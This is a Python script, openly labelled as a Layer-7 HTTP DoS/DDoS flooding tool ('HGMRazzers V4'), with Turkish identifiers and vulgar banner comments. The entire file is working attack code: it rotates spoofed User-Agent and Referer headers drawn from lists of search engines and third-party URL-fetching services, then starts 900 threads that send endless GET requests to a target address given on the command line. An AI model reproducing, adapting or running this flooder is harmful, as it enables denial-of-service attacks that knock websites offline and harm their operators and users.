# coding=utf-8
#!/usr/bin/python3

##################################################
##//////////////////////////////////////////////##
##=====HGMRazzers Her Dagim Siker #Kimse ??=====##
##\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\##
##==============================================##
## Script Name: HGMRazzers [HGMRazzers By HGM]. ##
## Script Version: V4.                          ##
## Layer: Layer-7.                              ##
## Method: GET [Http/S].                        ##
## Script Function: Dos/DDoS (Flooding) Http.   ##
## Coder/Developer: HGMNetwork By HGM.          ##
##==============================================##
##\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\##
##======HGMRazzers Iyi Sikisler Diler ;)========##
##//////////////////////////////////////////////##
##==============================================##
##                                              ##
__author__ = "HGMRazzers"
__license__ = "HGaming"
__version__ = "4"
__status__ = "Gelistiriliyor"

import sys
import time
import os
import threading
import requests
import urllib3
import random
import choice
import re
import argcomplete
import argparse

HGMRazzers_Tarayici=[]
HGMRazzers_Yonlendirici=[]

class HRenk:
   Turkuaz = '\033[38;5;51m'
   Yesil = '\033[38;5;46m'
   Sari = '\033[38;5;226m'
   Kirmizi = '\033[38;5;196m'
   Beyaz = '\033[38;5;15m'
   Sonlama = '\033[0m'
##                                              ##
##==============================================##
##\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\##
##========HGMRazzers By HGM Was Here ;))========##
##//////////////////////////////////////////////##
##################################################

def HGMRazzers_TarayiciList():

	global HGMRazzers_Tarayici
	HGMRazzers_Tarayici.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	HGMRazzers_Tarayici.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)'),
	HGMRazzers_Tarayici.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)'),
	HGMRazzers_Tarayici.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1'),
	HGMRazzers_Tarayici.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1'),
	HGMRazzers_Tarayici.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)'),
	HGMRazzers_Tarayici.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)'),
	HGMRazzers_Tarayici.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)'),
	HGMRazzers_Tarayici.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)'),
	HGMRazzers_Tarayici.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)'),
	HGMRazzers_Tarayici.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)'),
	HGMRazzers_Tarayici.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(HGMRazzers_Tarayici)

def HGMRazzers_Yonlendirici_List():

	global HGMRazzers_Yonlendirici
	HGMRazzers_Yonlendirici.append('http://www.google.com/?q=')
	HGMRazzers_Yonlendirici.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
	HGMRazzers_Yonlendirici.append('http://vk.com/profile.php?redirect=')
	HGMRazzers_Yonlendirici.append('http://www.usatoday.com/search/results?q=')
	HGMRazzers_Yonlendirici.append('http://engadget.search.aol.com/search?q=query?=query=..')
	HGMRazzers_Yonlendirici.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
	HGMRazzers_Yonlendirici.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
	HGMRazzers_Yonlendirici.append('http://yandex.ru/yandsearch?text=')
	HGMRazzers_Yonlendirici.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
	HGMRazzers_Yonlendirici.append('http://go.mail.ru/search?mail.ru=1&q=')
	HGMRazzers_Yonlendirici.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
	HGMRazzers_Yonlendirici.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
	HGMRazzers_Yonlendirici.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
	HGMRazzers_Yonlendirici.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
	HGMRazzers_Yonlendirici.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
	HGMRazzers_Yonlendirici.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
	HGMRazzers_Yonlendirici.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
	HGMRazzers_Yonlendirici.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
	HGMRazzers_Yonlendirici.append('http://help.baidu.com/searchResult?keywords=')
	HGMRazzers_Yonlendirici.append('https://www.yandex.com/yandsearch?text=')
	HGMRazzers_Yonlendirici.append('http://www.bing.com/search?q=')
	HGMRazzers_Yonlendirici.append('https://www.yandex.com/yandsearch?text=')
	HGMRazzers_Yonlendirici.append('https://duckduckgo.com/?q=')
	HGMRazzers_Yonlendirici.append('http://www.ask.com/web?q=')
	HGMRazzers_Yonlendirici.append('http://search.aol.com/aol/search?q=')
	HGMRazzers_Yonlendirici.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
	HGMRazzers_Yonlendirici.append('https://drive.google.com/viewerng/viewer?url=')
	HGMRazzers_Yonlendirici.append('http://validator.w3.org/feed/check.cgi?url=')
	HGMRazzers_Yonlendirici.append('http://host-tracker.com/check_page/?furl=')
	HGMRazzers_Yonlendirici.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
	HGMRazzers_Yonlendirici.append('http://jigsaw.w3.org/css-validator/validator?uri=')
	HGMRazzers_Yonlendirici.append('https://add.my.yahoo.com/rss?url=')
	return(HGMRazzers_Yonlendirici);

def HGMRazzers_RandomPaket(HpBoyut):
    HGMRazzers_RPaket = '';
    for i in range(0, HpBoyut):
        hgrp = random.randint(65, 90);
        HGMRazzers_RPaket += chr(hgrp);
    return(HGMRazzers_RPaket);

def HGMRazzers_HeaderGen():
    HGMRazzers_TarayiciList()
    HGMRazzers_Yonlendirici_List()
    
    global HGMRazzers_Tarayici
    global HGMRazzers_Yonlendirici
    
    HGMRazzers_Headerler = {
                'User-Agent': random.choice(HGMRazzers_Tarayici),
                'Cache-Control': 'no-cache',
                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
                'Referer': random.choice(HGMRazzers_Yonlendirici) + HGMRazzers_RandomPaket(random.randint(5,10)),
				'Keep-Alive': str(random.randint(110,120)),
				'Connection': 'keep-alive'
    }
    
    return HGMRazzers_Headerler

def HGMRazzers_Saldiri(HGMRazzers_Host_Adresi):
	global HGMRazzers_SpamSayi
	headers = HGMRazzers_HeaderGen()
	try:
		request = requests.get(HGMRazzers_Host_Adresi, headers=headers)
	except:
		pass

class HGMRazzers_SaldiriBaslat(threading.Thread):
	def run(self):
		try:
			while True:
				global HGMRazzers_Host_Adresi
				HGMRazzers_Saldiri(HGMRazzers_Host_Adresi)
		except:
			pass

def main(argv):  
        parser = argparse.ArgumentParser();
        parser.add_argument('-hgg', help='Hedef Host/Ip. Ornek: || -q <http(S)://Hedef_Host_Veya_IP> ||')
        argcomplete.autocomplete(parser)
        args = parser.parse_args()

        global HGMRazzers_Host_Adresi

        if args.hgg:
                HGMRazzers_Host_Adresi = args.hgg
                for i in range(900):
                        hgmtp = HGMRazzers_SaldiriBaslat()
                        hgmtp.start()

        if len(sys.argv)==1:

                exit()

if __name__ == "__main__":
   main(sys.argv[1:])
